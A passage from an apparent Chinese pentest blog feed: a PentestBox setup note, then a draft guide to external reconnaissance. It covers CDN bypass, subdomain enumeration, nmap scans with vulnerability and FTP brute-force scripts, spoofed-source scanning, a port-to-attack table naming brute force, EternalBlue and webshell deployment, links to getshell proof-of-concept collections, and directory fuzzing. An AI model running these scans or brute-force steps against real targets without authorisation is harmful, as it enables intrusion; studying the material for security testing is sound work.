class="attribute">PATH</span>=C:\PentestBox\base\ruby_devkit\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\strawberry-perl</span><br></pre></td></tr></table></figure><a id="more"></a><p>C:\PentestBox\config\aliases</p><p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201202225419159.png" alt="image-20201202225419159"></p><p>使用过程中产生兼容性问题解决如下</p><p>如下直接输入sqlmap无法使用，先输入cmd进行加载，然后输入sqlmap即可以使用</p><p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201202225536059.png" alt="image-20201202225536059"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安装后设置环境变量如下：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/12/02/记PentestBox安装/image-20201203102444918.png&quot; alt=&quot;image-20201203102444918&quot;&gt;&lt;/p&gt;&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\python&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\jdk1.8.0_74\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\jdk1.8.0_74\jre\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\ruby\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\curl\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\ruby\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\get-pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\PortableGit\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\Windows\System32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\clink&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\clink-completions&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\conemu-maximus5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\ruby_devkit\bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;PATH&lt;/span&gt;=C:\PentestBox\base\strawberry-perl&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="tool" scheme="https://choge.top/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>外网信息收集（草稿，未完成）</title>
    <link href="https://choge.top/2020/11/01/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://choge.top/2020/11/01/外网信息收集/</id>
    <published>2020-11-01T07:56:33.000Z</published>
    <updated>2021-02-18T08:30:30.582Z</updated>
    
    <content type="html"><![CDATA[<p>渗透的本质是信息收集</p><p>信息收集越全，攻击面就越广，拿下目标的可能性就越大</p><p><a href="https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ</a></p><h3 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h3><h4 id="开源情报"><a href="#开源情报" class="headerlink" title="开源情报"></a>开源情报</h4><h4 id="whois信息查询"><a href="#whois信息查询" class="headerlink" title="whois信息查询"></a>whois信息查询</h4><h4 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h4><p>ping测试网站</p><p>· <a href="https://wepcc.com/" target="_blank" rel="noopener">https://wepcc.com/</a></p><p>· <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p><a id="more"></a><p>· <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a></p><h5 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h5><p><strong>(1)查询子域名：</strong>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。传送门——&gt; 子域名信息查询</p><p><strong>(2)查询主域名</strong>：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。</p><p><strong>(3)邮件服务器：</strong>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。</p><p><strong>(4)查看域名历史解析记录：</strong>也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站<a href="https://www.netcraft.com" target="_blank" rel="noopener">https://www.netcraft.com</a> 来观察域名的IP历史记录。</p><p><strong>(5)国外访问</strong>：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a> 访问 ，可能会得到真实的ip地址。</p><p><strong>(6)Nslookup查询</strong>：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：各种解析记录</p><p><strong>(7)网站漏洞</strong>：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址</p><p><strong>(8)Censys查询SSL证书找到真实IP：</strong>利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在<a href="https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址" target="_blank" rel="noopener">https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址</a></p><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:***trade.com</p><h5 id="使用IP地址访问"><a href="#使用IP地址访问" class="headerlink" title="使用IP地址访问"></a>使用IP地址访问</h5><p>查找出真实IP地址后，使用真实IP地址和网址绑定写入本地hosts文件就能直接访问</p><h4 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h4><h4 id="子域"><a href="#子域" class="headerlink" title="子域"></a>子域</h4><h5 id="Layer子域名爆破工具"><a href="#Layer子域名爆破工具" class="headerlink" title="Layer子域名爆破工具"></a>Layer子域名爆破工具</h5><h5 id="subDomainBrute"><a href="#subDomainBrute" class="headerlink" title="subDomainBrute"></a>subDomainBrute</h5><h5 id="HTTP证书查询"><a href="#HTTP证书查询" class="headerlink" title="HTTP证书查询"></a>HTTP证书查询</h5><p><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p><h5 id="Google查询"><a href="#Google查询" class="headerlink" title="Google查询"></a>Google查询</h5><p>Site:baidu.com -www</p><h4 id="sublist3r"><a href="#sublist3r" class="headerlink" title="sublist3r"></a>sublist3r</h4><p>python sublist3r.py -d target.com -b -t 50 -o dns.txt</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201124154612170.png" alt="image-20201124154612170"></p><p>将域名解析为ip</p><p>for i in `cat dns.txt` ;do host $i|grep -E -o “([0-9]{1,3}[.]{3}[0-9]{1,3})”;done&gt;ips.txt</p><p>C段</p><p>cat ips.txt |sort|uniq|grep -E -o “([0-9]{1,3}[.])”uniq -c |awk ‘{if ($1&gt;=5) print $2”0/24”}’</p><p><a href="https://github.com/FortyNorthSecurity/EyeWitness" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/EyeWitness</a></p><p>11.04.56.png</p><p>11.06.13.png</p><h5 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h5><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>yougestsignal</p><p><a href="https://www.yougetsignal.com/" target="_blank" rel="noopener">https://www.yougetsignal.com/</a></p><h5 id="自治系统查询"><a href="#自治系统查询" class="headerlink" title="自治系统查询"></a>自治系统查询</h5><p><a href="https://bgp.he.net/" target="_blank" rel="noopener">https://bgp.he.net/</a></p><p>渗透一些大型目标时，在目标公司有 AS（自治系统）的情况下可以通过 个运营商来查询目标公司的自治系统号和 CIDR 路由。自治系统分配情況也可以在 IANA 查询到</p><p><a href="https://www.iana.org/assignments/as-numbers/as-numbers" target="_blank" rel="noopener">https://www.iana.org/assignments/as-numbers/as-numbers</a>. Xhtml</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>子域名查询在渗透测试中非常重要，但不同的工具，不同的设备活网络查询出的子域名并不相同，子域名查询建议使用2-3个工具组合使用。</p><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h4><p><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p><p><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a></p><p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></p><h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h4><h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>shodan</p><p><a href="https://nosec.org/home/detail/3713.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3713.html</a></p><p>ZoomEye</p><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="域名解析为ip"><a href="#域名解析为ip" class="headerlink" title="域名解析为ip"></a>域名解析为ip</h4><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>nmap常用语法</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483849&amp;idx=1&amp;sn=7448559219c08db3913d027064af17da&amp;chksm=eaad81f4ddda08e24435273ce2ce762060197223ca3719a38589299bbe5b3471e36531201380&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483849&amp;idx=1&amp;sn=7448559219c08db3913d027064af17da&amp;chksm=eaad81f4ddda08e24435273ce2ce762060197223ca3719a38589299bbe5b3471e36531201380&amp;scene=21#wechat_redirect</a></p><p>nmap -p 1-65535 -T4 -A -v 47.91.163.1-254 -oX 47.91.163.1-254.xml</p><p>扫描47.91.163.1-254段IP地址，使用快速扫描模式，输出47.91.163.1-254.xml</p><p>nmap -v 47.91.163.1-254</p><p>扫描C段常见TCP端口</p><p>namp -O 47.91.163.1</p><p>探测47.91.163.1服务器OS版本和TCP端口开放情况</p><p>nmap -sn 10.0.1.161-166</p><p>扫描存活主机 </p><p>namp -e eth0 10.0.1.168 -S 10.0.1.168 -Pn</p><p>使用伪装地址10.0.1.168对10.0.1.161进行扫描</p><p>nmap -iflist</p><p>查看本地路由和接口</p><p>nmap –script smb-vuln-ms17-010.nse -p 445 192.168.1.1</p><p>nmap -script = samba-vuln-cve-2012-1182 -p 139 192.168.1.3</p><p>对主机192.168.1.1使用漏洞脚本smb-vuln-ms17-010.nse进行检测</p><p>对主机192.168.1.3使用漏洞脚本amba-vuln-cve-2012-1182进行检测</p><p>nmap –script whios-domain.nse <a href="http://www.secbang.com" target="_blank" rel="noopener">www.secbang.com</a></p><p>获取secbang.com的域名注册情况，该脚本对国外域名支持较好</p><p>nmap –script ftp-brute -p 21 127.0.0.1</p><p>暴力破解127.0.0.1的ftp账号</p><p>nmap -sv -script = http-enum 127.0.0.1</p><p>枚举127.0.0.1的目录</p><p>nmap-bootstrap.xsl模板将nmap扫描结果转换成HTML格式</p><p>nmap -iL ips.txt -sS -T4 -A -sC -oA scanme</p><p> xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml</p><ol><li>yum install libxslt</li></ol><p><a href="https://github.com/davidtavarez/WebMap" target="_blank" rel="noopener">https://github.com/davidtavarez/WebMap</a></p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>端口号</td><td>端口说明</td><td>攻击技巧</td></tr><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>445</td><td>smb</td><td>永恒之蓝</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td></td></tr></tbody></table><h4 id="mascan"><a href="#mascan" class="headerlink" title="mascan"></a>mascan</h4><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p><p>扫描一个包</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201121215435309.png" alt="image-20201121215435309"></p><p>根据带宽设置速度</p><p>Masscan发送一个包是54字节，如果我们每秒钟要发送10w/秒，就需要54*100000/1024/1024=5.14M以上的带宽。通常windows每秒能发25W/秒，linux250W/秒。</p><p>mascan </p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201125230216171.png" alt="image-20201125230216171"></p><h5 id="EyeWitness"><a href="#EyeWitness" class="headerlink" title="EyeWitness"></a>EyeWitness</h5><p><a href="https://github.com/FortyNorthSecurity/EyeWitness/tree/master" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/EyeWitness/tree/master</a></p><p>其他工具<a href="https://github.com/breenmachine/httpscreenshot" target="_blank" rel="noopener">https://github.com/breenmachine/httpscreenshot</a></p><p>kali下</p><p>apt-get install xvfb</p><p>pip3 install xvfb</p><p><a href="https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux32.tar.gz" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux32.tar.gz</a></p><p>解压后放入 /usr/local/bin/ 下 chmod +x加入权限</p><p>Python EyeWitness.py  -f target.com-dns.txt –web  –add-http-ports 80,81,88,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8500,8888,9000,9001,9200,9080,10000,10051,50000 –add-https-ports 43,8443,9043</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201125134156854.png" alt="image-20201125134156854"></p><p>前面看到的是用 Eyewitness 解析 DNS.txt，我们也可以直接解析 nmap 的扫描结果</p><p>nmap -T4  ip.txt -oX  scan.xml -p 80,81,88,443,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8443,8500,8888,9000,9001,9200,9043,9080,10000,10051,50000 -Pn –open -n</p><p> python EyeWitness.py -x scan.xml –web –no-dns –active-scan</p><p>namp解析工具</p><p><a href="https://github.com/ilyar/xsltproc" target="_blank" rel="noopener">https://github.com/ilyar/xsltproc</a></p><p>nmap解析模版</p><p><a href="https://github.com/honze-net/nmap-bootstrap-xsl" target="_blank" rel="noopener">https://github.com/honze-net/nmap-bootstrap-xsl</a></p><p>xsltproc -o mt.html nmap-bootstrap.xsl mt.xml</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126155323793.png" alt="image-20201126155323793"></p><p><a href="https://github.com/Sholway/nmap-parse-output" target="_blank" rel="noopener">https://github.com/Sholway/nmap-parse-output</a></p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126160435751.png" alt="image-20201126160435751"></p><p>./xray_darwin_amd64 webscan –url-file 1.file –html-output web.html</p><p>文件格式</p><p><a href="http://172.16.49.233:8080/" target="_blank" rel="noopener">http://172.16.49.233:8080/</a><br><a href="http://172.16.49.233:7001/" target="_blank" rel="noopener">http://172.16.49.233:7001/</a></p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126164228264.png" alt="image-20201126164228264"></p><h3 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h3><h4 id="获取网页"><a href="#获取网页" class="headerlink" title="获取网页"></a>获取网页</h4><p>看截图</p><h4 id="快速查找漏洞库"><a href="#快速查找漏洞库" class="headerlink" title="快速查找漏洞库"></a>快速查找漏洞库</h4><h3 id="批量漏洞检测"><a href="#批量漏洞检测" class="headerlink" title="批量漏洞检测"></a>批量漏洞检测</h3><p>Web logic</p><p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a>  可扫出漏洞</p><p>goby</p><p>poc</p><p>Strust2</p><p>Weblogic</p><p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a></p><p>thinkphp5</p><p><a href="https://github.com/Mr-xn/Penetration_Testing_POC/tree/master/tp5-getshell" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC/tree/master/tp5-getshell</a></p><p>汇总</p><p><a href="https://github.com/Mr-xn/Penetration_Testing_POC" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC</a></p><p>K8工具</p><p><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><h3 id="单独站点信息收集"><a href="#单独站点信息收集" class="headerlink" title="单独站点信息收集"></a>单独站点信息收集</h3><p>对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）；<img src="https://img-blog.csdnimg.cn/20200721111125407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1a2lub3Jvbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>二、备案号查询</strong></p><p>访问<a href="http://www.beianbeian.com/网站" target="_blank" rel="noopener">http://www.beianbeian.com/网站</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zWlg0TzFReEd0TUpkZk80bjdBNVpBNHpYYmtJR3NOZDRhell1ZlR5Y0syODloZmVEUjVta2xEbGJYdzZuRFp4RDJnaWFwNVlObUdpY05BR3IxMFBDNXBnLzY0MA?x-oss-process=image/format,png" alt="img"></p><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>nmap -O IP地址</p><p>nmap -A IP地址</p><p>ping IP地址，观察TTL值，一般来说，Windows的TTL为128，Linux为64。一般大于100的Windows，几十到100为Linux，但是此方法不一定准确</p><h4 id="网站容器"><a href="#网站容器" class="headerlink" title="网站容器"></a>网站容器</h4><p>apache、nginx、tomcat、IIS</p><p>whatweb </p><h4 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h4><p>php、jsp、asp、aspx</p><p>判断方法</p><p>1：可以根据网站URL来判断</p><p>2：site:xxx  filetype:php</p><p>3：浏览器插件来判断 Wappalyzer</p><p><a href="https://www.netcraft.com/" target="_blank" rel="noopener">https://www.netcraft.com/</a></p><p><a href="https://sitereport.netcraft.com/?url=http%3A%2F%2Ftestphp.vulnweb.com%2F" target="_blank" rel="noopener">https://sitereport.netcraft.com/?url=http%3A%2F%2Ftestphp.vulnweb.com%2F</a></p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201111103805231.png" alt="image-20201111103805231"></p><p>whatweb </p><h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p>mysql、oracle、access、sqlserver</p><p>端口判断</p><p>脚本类型做大致判断</p><h4 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h4><p><strong>HTTP 标头</strong></p><ul><li>标识 web 应用程序框架的最基本形式是查看 HTTP 响应标头中的 X-Powered-By  字段。</li></ul><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/18.png" alt="img"></p><p><strong>c) Cookies</strong></p><p>确定当前 web 框架的另一个类似的、更可靠的方法是特定框架的 cookie。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/19.png" alt="img"></p><p><strong>d) HTML 源代码</strong></p><p>此技术基于在 HTML 页面源代码中查找某些模式。我们可以找到很多信息, 帮助测试人员识别特定的 web 应用程序。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/20.png" alt="img"></p><p><strong>e）特定文件和文件夹</strong></p><p>每个应用程序在服务器上都有自己的特定文件和文件夹结构。我们可以使用工具或手动访问它们。</p><p>扫描器</p><p>Test404 根据特定文件夹md5值</p><p><strong>f）Dirbusting 示例</strong></p><ul><li>谷歌黑客技术</li></ul><p><a href="https://ssl.microsofttranslator.com/bv.aspx?from=&to=zh-CHS&a=https%3A%2F%2Fwww.exploit-db.com%2Fghdb%2F4675%2F" target="_blank" rel="noopener">https://www.exploit-db.com/ghdb/4675/</a></p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/21-1.png" alt="img"></p><ul><li>BurpSuite 入侵</li></ul><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/22.png" alt="img"></p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/27.png" alt="img"></p><p><strong>g）常见应用程序标识符</strong></p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/23.png" alt="img"></p><p><strong>h）Nikto</strong></p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/25-1.png" alt="img"></p><p><strong>i）Whatweb</strong></p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/26-1.png" alt="img"></p><p> (1)  云悉：<a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p> 御剑</p><p>dirbuster  字典比较关键</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201111163723352.png" alt="image-20201111163723352"></p><p>wfuzz</p><p>可以扫描多级目录</p><p>wfuzz -w /root/FuzzDicts/directoryDicts/en_dirctories_all.txt -w /root/FuzzDicts/directoryDicts/php/phpFileName.txt <a href="http://192.168.0.102/wordpress/FUZZ/FUZ2Z" target="_blank" rel="noopener">http://192.168.0.102/wordpress/FUZZ/FUZ2Z</a></p><p>Webdirscan</p><p>python2 webdirscan.py -o 1.txt -t 10 <a href="http://www.xx.com" target="_blank" rel="noopener">http://www.xx.com</a>    <em># -o 指定输出的文件，-t 指定线程数</em></p><p>Dirsearch</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>cansina</p><p><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a></p><p>dirmap</p><p><a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p><p>字典文件</p><p><a href="https://github.com/Bo0oM/fuzz.txt" target="_blank" rel="noopener">https://github.com/Bo0oM/fuzz.txt</a></p><p> robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。<br>假如编写的robots.txt文件内容如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/data/</span></span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/db/</span><span class="string">Disallow:</span> <span 